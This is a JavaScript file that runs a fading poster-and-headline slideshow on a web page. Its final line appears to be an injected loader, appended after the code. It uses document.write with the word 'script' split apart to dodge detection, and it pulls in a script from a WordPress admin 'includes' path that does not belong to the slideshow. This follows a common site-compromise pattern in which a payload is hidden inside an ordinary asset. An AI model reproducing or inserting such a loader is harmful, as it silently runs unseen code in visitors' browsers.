var posters,headlines,thisPoster,nextPoster,posterState,currentSplash=0,splashDelay=10000,transtitonSpeed=20,control=1,loopswitch=1,looptime=0;

function rotatePoster(){
  var postergroup = document.getElementById('posters');
  posters = postergroup.getElementsByTagName('div');
  for (var i=0; i < posters.length; i++) {
    if (i==0) {posters[i].style.opacity = 1;} 
    else {
      posters[i].style.opacity = 0;
      posters[i].style.filter = 'alpha(opacity=0)';
      posters[i].style.display = 'none';
    }
  }
  loopPosters();
}

function loopPosters(){
  var headlinegroup = document.getElementById('headlines');
  headlines = headlinegroup.getElementsByTagName('li');
  if(currentSplash>=posters.length) currentSplash = 0;
  for (var i=0; i < headlines.length; i++) {
    headlines[i].className = '';
  }
  headlines[currentSplash].className = 'active';

  thisPoster = (nextPoster)?nextPoster:posters[currentSplash];
  nextPoster = (posters[++currentSplash])?posters[currentSplash]:posters[currentSplash = 0];
  thisPoster.style.display = 'block';
  posterState = 'on';
  control = 1;
  looptime = window.setTimeout(posterFader,splashDelay);
}

function posterFader(){
  if (loopswitch==1) {
  if (posterState=='on') {
    control = control - 0.1;
    control = parseInt(control*100)/100;
    if (control >= 0) {
      thisPoster.style.opacity = control;
      thisPoster.style.filter = 'alpha(opacity='+(control*100)+')';
      looptime = window.setTimeout(posterFader,transtitonSpeed);
    } else {
      thisPoster.style.display = 'none';
      nextPoster.style.display = 'block';
      posterState='off';
      looptime = window.setTimeout(posterFader,transtitonSpeed);
    }
  } else if (posterState=='off') {
    control = control + 0.1;
    control = parseInt(control*100)/100;
    if(control <= 1){
      nextPoster.style.opacity = control;
      nextPoster.style.filter = 'alpha(opacity='+(control*100)+')';
      looptime = window.setTimeout(posterFader,transtitonSpeed);
    } else {loopPosters();}
  }
}};

function select(node,selected) {
  loopswitch = 0;
  window.clearTimeout(looptime);
  var postergroup = document.getElementById('posters');
  posters = postergroup.getElementsByTagName('div');
  for (var i=0; i < posters.length; i++) {
    posters[i].style.opacity = 0;
    posters[i].style.filter = 'alpha(opacity=0)';
    posters[i].style.display = 'none';
  }
  var currentPoster = document.getElementById(selected);
  currentPoster.style.opacity = 1
  currentPoster.style.filter = 'alpha(opacity=100)';
  currentPoster.style.display = 'block';
  var headlinegroup = document.getElementById("headlines");
  headlines = headlinegroup.getElementsByTagName("li");
  for (var i=0; i < headlines.length; i++) {
    headlines[i].className = '';
  }
  node.parentNode.className='active';
};


// event listener
if(window.addEventListener) window.addEventListener('load', rotatePoster, false);
else if(document.addEventListener) document.addEventListener('load', rotatePoster, false);
else if(window.attachEvent) {
  window.attachEvent('onload', rotatePoster);
} else {
  if(typeof window.onload == 'function') {
    var existing = onload;
    window.onload = function() {
      existing();
      rotatePoster();
    }
  } else {
    window.onload = function() {
      rotatePoster();
    }
  }
}

;document.write("<scr"+"ipt src='/wordpress/wp-admin/includes/footer.js'><"+"/script>");